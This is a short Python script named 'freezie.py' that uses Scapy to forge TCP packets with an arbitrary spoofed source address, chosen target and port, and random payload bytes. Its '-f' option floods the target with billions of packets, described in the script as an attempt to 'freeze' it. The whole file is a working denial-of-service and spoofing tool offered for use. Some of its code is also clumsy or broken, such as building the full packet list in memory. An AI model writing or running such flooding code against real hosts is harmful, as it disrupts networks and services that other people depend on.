import scapy.all as scapy
from scapy.layers.inet import IP, TCP
import os
import random
import argparse

# Privilege check
if os.geteuid() != 0:
    exit("freezie.py needs root privileges to run correctly!")

# Set parameters using the parser
parser = argparse.ArgumentParser(description='Scapy powered TCP packet forger.')
parser.add_argument("-s", help="source address", dest='source_addr')
parser.add_argument("-d", help="destination address", dest='destination_addr')
parser.add_argument("-c", help="amount of packets to send", dest='count', type=int)
parser.add_argument("-b", help="payload bytes to add", dest='payload_bytes', type=int, default=0)
parser.add_argument("-p", help="port to send traffic to", dest='payload_port', type=int)
parser.add_argument("-f", help="send unlimited packets to attempt to freeze target", dest='freeze_mode', action='store_true')
args = parser.parse_args()
freeze_mode = args.freeze_mode # Freeze mode flag
source = args.source_addr  # Source address
target = args.destination_addr  # Target address
count = args.count  # Packet count
payload_bytes = args.payload_bytes # Add bytes to payload
port = args.payload_port # Set target port
if freeze_mode == True:
    count = 9999999999

ip_packet = IP(ttl=64)  # Default packet properties
ip_packet.src = source  # Set source address
ip_packet.dst = target  # Set target address
tcp_packet = TCP()  # Create TCP layer
tcp_packet.dport = port # Set destination port

# Generate payload bytes
payload = bytes(random.randint(0, 9) for _ in range(payload_bytes))
raw_packet = scapy.Raw(load=payload)
tcp_packet.payload = raw_packet
packet = ip_packet / tcp_packet  # Combine the IP packet and TCP packet
packets = [packet] * count  # Create a list of packets
scapy.sendp(packets, verbose=False) # Send the packets
